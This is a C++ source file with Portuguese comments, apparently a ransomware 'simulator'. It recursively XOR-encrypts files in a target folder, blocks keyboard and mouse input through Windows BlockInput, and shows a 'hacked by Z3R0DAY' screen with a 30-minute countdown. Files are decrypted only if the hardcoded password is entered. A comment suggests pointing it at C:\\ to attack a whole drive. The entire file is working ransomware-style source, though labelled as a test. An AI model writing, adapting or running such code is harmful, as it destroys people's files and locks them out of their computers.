#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <atomic>
#include <windows.h> // Essencial para o bloqueio real do teclado/mouse

namespace fs = std::filesystem;

// --- MÓDULO 1: ESTADOS DO SISTEMA ---
enum class AppState {
    WAITING_FOR_PASSWORD,
    DECRYPTING,
    LOCKED_PERMANENTLY,
    SUCCESS
};

// --- MÓDULO 2: MOTOR DE CRIPTOGRAFIA (XOR ENGINE) ---
class CryptoEngine {
private:
    char key; 

public:
    CryptoEngine(std::string password) {
        // Usa o primeiro caractere da senha como chave de criptografia
        key = password.empty() ? 'a' : password[0];
    }

    void processFile(const fs::path& filePath, bool encrypt) {
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return;

        // Lê o conteúdo do arquivo para o buffer
        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        // Aplica a operação XOR (Criptografa ou Descriptografa)
        for (size_t i = 0; i < buffer.size(); i++) {
            buffer[i] ^= key; 
        }

        // Escreve o resultado de volta no arquivo
        std::ofstream outFile(filePath, std::ios::binary);
        if (!outFile) return;
        outFile.write(buffer.data(), buffer.size());
        outFile.close();
    }
};

// --- MÓDULO 3: SCANNER DE ARQUIVOS (O ATACANTE) ---
class FileScanner {
private:
    CryptoEngine& engine;

public:
    FileScanner(CryptoEngine& ce) : engine(ce) {}

    void scanAndProcess(const std::string& targetDir, bool encrypt) {
        if (!fs::exists(targetDir)) {
            std::cout << "[!] Erro: Diretorio " << targetDir << " nao encontrado.\n";
            return;
        }

        for (const auto& entry : fs::recursive_directory_iterator(targetDir)) {
            try {
                if (entry.is_regular_file()) {
                    std::string pathStr = entry.path().string();

                    // FILTROS DE SEGURANÇA (O QUE NÃO AFETA)
                    // 1. Ignora a pasta Windows
                    if (pathStr.find("Windows") != std::string::npos) continue;
                    
                    // 2. Ignora o próprio executável
                    if (pathStr.find("simulador.exe") != std::string::npos) continue;

                    // 3. Ignora arquivos de sistema críticos
                    if (pathStr.find(".sys") != std::string::npos || 
                        pathStr.find(".dll") != std::string::npos) continue;

                    engine.processFile(entry.path(), encrypt);
                }
            } catch (...) { continue; } 
        }
    }
};

// --- MÓDULO 4: CORE (TIMER E CONTROLE DE TEMPO) ---
class RansomwareCore {
private:
    std::atomic<int> timeLeft; 
    std::atomic<AppState> currentState;
    const int INITIAL_TIME = 30 * 60; // 30 minutos

public:
    RansomwareCore() : timeLeft(INITIAL_TIME), currentState(AppState::WAITING_FOR_PASSWORD) {}

    void startTimer() {
        while (timeLeft > 0 && currentState == AppState::WAITING_FOR_PASSWORD) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            timeLeft--;
            
            if (timeLeft <= 0) {
                currentState = AppState::LOCKED_PERMANENTLY;
            }
        }
    }

    void checkPassword(std::string input) {
        if (currentState == AppState::LOCKED_PERMANENTLY) return;

        if (input == "batata") {
            currentState = AppState::DECRYPTING;
        } else {
            std::cout << "\n[!] SENHA INCORRETA!\n";
        }
    }

    AppState getState() const { return currentState.load(); }
    int getTime() const { return timeLeft.load(); }
};

// --- MÓDULO 5: INTERFACE (SIMULAÇÃO VISUAL) ---
class Renderer {
public:
    void renderUI(const RansomwareCore& core) {
        // Limpa o console para simular a interface ocupando a tela
        system("cls"); 

        std::cout << "\n====================================================\n";
        std::cout << "[SISTEMA BLOQUEADO - MODO FULLSCREEN SIMULADO]\n";
        std::cout << "[TECLADO/MOUSE: BLOQUEADOS | ATALHOS: DESATIVADOS]\n";
        std::cout << "====================================================\n";
        
        std::cout << "\n[IMAGEM: https://encrypted-tbn0.gstatic.com/...]\n";
        std::cout << "[AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
        std::cout << "----------------------------------------------------\n";

        if (core.getState() == AppState::LOCKED_PERMANENTLY) {
            std::cout << "\n[!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
        } else {
            int mins = core.getTime() / 60;
            int secs = core.getTime() % 60;
            std::cout << "Tempo para recuperacao: " << mins << ":" << (secs < 10 ? "0" : "") << " segundos\n";
            std::cout << "Digite a senha para descriptografar: ";
        }
    }
};

// --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
int main() {
    // --- CONFIGURAÇÃO DO ALVO ---
    // Mude para "C:\\" para testar o ataque total na sua VM
    std::string pastaAlvo = "./test_folder"; 
    std::string senhaCorreta = "batata";
    
    RansomwareCore core;
    CryptoEngine engine(senhaCorreta);
    FileScanner scanner(engine);
    Renderer renderer;

    std::cout << "--- INICIALIZANDO SISTEMA DE TESTE ---\n";
    std::cout << "Alvo configurado: " << pastaAlvo << "\n";

    // 1. Inicia a Criptografia Imediata
    std::cout << "[!] Iniciando processo de criptografia...\n";
    scanner.scanAndProcess(pastaAlvo, true); 
    std::cout << "[!] Arquivos criptografados com sucesso.\n";

    // 2. BLOQUEIO REAL DO SISTEMA (Teclado e Mouse)
    // IMPORTANTE: Rodar como Administrador para o BlockInput funcionar
    BlockInput(TRUE); 

    // 3. Inicia o Timer em uma thread separada
    std::thread timerThread(&RansomwareCore::startTimer, &core);

    // 4. Loop de Interface e Input
    while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
        renderer.renderUI(core);

        std::string input;
        std::cin >> input;

        if (core.getState() == AppState::WAITING_FOR_PASSWORD) {
            core.checkPassword(input);
            
            if (core.getState() == AppState::DECRYPTING) {
                std::cout << "\n[!] Senha aceita. Iniciando DESCRIPTOGRAFIA...\n";
                scanner.scanAndProcess(pastaAlvo, false); 
                std::cout << "[!] SUCESSO! Arquivos recuperados.\n";
                break; 
            }
        }

        if (core.getTime() < 1) break; 
    }

    // 5. LIBERAÇÃO DO SISTEMA (Ao terminar ou travar)
    BlockInput(FALSE); 
    
    if (core.getState() == AppState::LOCKED_PERMANENTLY) {
        std::cout << "\n[!] SISTEMA TRAVADO. O TEMPO ACABOU.\n";
    }

    timerThread.join();
    return 0;
}